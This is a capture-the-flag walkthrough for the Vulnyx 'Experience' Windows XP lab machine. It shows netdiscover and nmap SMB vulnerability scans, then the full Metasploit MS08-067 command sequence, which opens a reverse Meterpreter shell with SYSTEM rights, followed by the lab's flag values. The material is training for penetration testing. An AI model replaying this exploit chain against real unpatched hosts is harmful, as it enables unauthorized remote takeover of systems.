---
icon: windows
---

**Platform:** Vulnyx\
**Operating System:** Windows

> **Tags:** `Windows` `Windows XP` `SMB` `NSE Scripts` `MS08-067` `NetAPI` `Metasploit` `Stack Buffer Overflow`

## INSTALLATION

We download the `zip` containing the `.ova` of the Experience machine, extract it, and import it into VirtualBox.

We configure the network interface of the Experience machine and run it alongside the attacker machine.

## HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to Experience, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:53:c4:af      1      60  PCS Systemtechnik GmbH      
 10.0.4.34       08:00:27:79:32:15      1      60  PCS Systemtechnik GmbH
```

We identify with high confidence that the victim’s IP is `10.0.4.34`.

## PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.34
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:29 CET
Nmap scan report for 10.0.4.34
Host is up (0.00015s latency).
Not shown: 59625 closed tcp ports (reset), 5907 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
MAC Address: 08:00:27:79:32:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.26 seconds
```

We identify port `445` (SMB) as open, among others, and determine that we are facing a `Windows XP` machine.

We leverage Nmap's `NSE scripts` to scan for specific vulnerabilities within the `SMB` service.

```bash
sudo nmap -p445 --script="smb-vuln-*" 10.0.4.34
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:29 CET
Nmap scan report for 10.0.4.34
Host is up (0.00026s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:79:32:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds
```

The scan reveals that the target is susceptible to `MS08-067`, which is a `RCE` vulnerability.

We are aware that there is a specific `Metasploit` module to target this vulnerability.

## METASPLOIT

```bash
msfconsole
```

```bash
msf > search ms08-067
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > show options
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.0.4.34
msf exploit(windows/smb/ms08_067_netapi) > run
```

Info:

```
[*] Started reverse TCP handler on 10.0.4.12:4444 
[*] 10.0.4.34:445 - Automatically detecting the target...
[*] 10.0.4.34:445 - Fingerprint: Windows XP - Service Pack 2 - lang:Unknown
[*] 10.0.4.34:445 - We could not detect the language pack, defaulting to English
[*] 10.0.4.34:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
[*] 10.0.4.34:445 - Attempting to trigger the vulnerability...
[*] Sending stage (188998 bytes) to 10.0.4.34
[*] Meterpreter session 1 opened (10.0.4.12:4444 -> 10.0.4.34:1027) at 2025-12-08 21:51:27 +0100

meterpreter >
```

We successfully execute the exploit and establish a `Meterpreter` session.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

We already have `SYSTEM` privileges!

Finally, we locate both the `user flag` and the `root flag` in the `C:\Documents and Settings\bill\Desktop` directory.

```
meterpreter > cat user.txt 
f9e24c8da0686680decee9e594178a2e 
cmeterpreter > cat root.txt 
c1d5e7e4efece4a6022c4a4080c8114d
```
